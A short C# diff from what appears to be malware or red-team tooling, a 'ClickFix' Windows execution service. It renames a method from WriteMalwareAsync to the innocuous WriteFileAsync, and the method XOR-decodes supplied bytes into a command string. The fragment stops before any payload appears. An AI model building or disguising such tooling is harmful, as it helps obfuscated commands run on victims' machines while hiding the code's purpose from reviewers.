@@ -17,7 +17,7 @@ public class WindowsExecutionServiceClickfix : IExecutionService {
         _logger = logger;
     }
 
-    public async Task<bool> WriteMalwareAsync(string filePath, byte[] content, byte? xorKey = null) {
+    public async Task<bool> WriteFileAsync(string filePath, byte[] content, byte? xorKey = null) {
         cmd = System.Text.Encoding.UTF8.GetString(content);
 
         // xor decode
